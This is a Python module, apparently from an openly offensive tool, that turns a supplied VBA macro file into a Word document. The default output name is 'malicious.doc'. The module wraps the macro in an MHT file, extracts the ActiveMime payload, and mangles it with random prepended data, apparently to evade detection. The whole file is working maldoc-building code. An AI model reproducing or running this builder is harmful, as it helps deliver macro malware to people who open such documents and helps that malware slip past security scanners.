#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Isis (@0x1sis)


import email
import base64
from termcolor import colored
from pathlib import Path
from ..mht.mht_generate import MHTGenerator
from ..activemime.activemime_mangler import ActiveMimeMangler


class DocGenerator:
    def __init__(self, vba_file, doc_file=None, output_file="malicious.doc"):
        self.vba_file = Path(vba_file).resolve()
        self.doc_file = Path(doc_file).resolve() if doc_file else None
        self.output_file = Path(output_file).resolve()

    def doc_generate(self):
        print(colored("[+] Generate MHT file", "light_green"))
        mht_generator = MHTGenerator(self.vba_file, self.doc_file, self.output_file)
        mht_generator.run()

        mht_file = self.output_file.with_suffix(".mht")

        print(colored("[+] ActiveMime encapsulation", "light_green"))
        raw_activemime = None
        with open(mht_file, 'rb') as infile:
            mhtml = email.message_from_binary_file(infile)
            for part in mhtml.walk():
                if "x-mso" in part.get_content_subtype():
                    print(colored("[+] Found ActiveMime content", "light_green"))
                    raw_activemime = base64.b64decode(part.get_payload())
                    break

        if not raw_activemime:
            print("[-] No ActiveMime content found")
            exit()


        mangler = ActiveMimeMangler(raw_activemime)
        mangler.set_prepended_data(mangler.generate_random_prepended_data())
        mangler.save_document(self.output_file)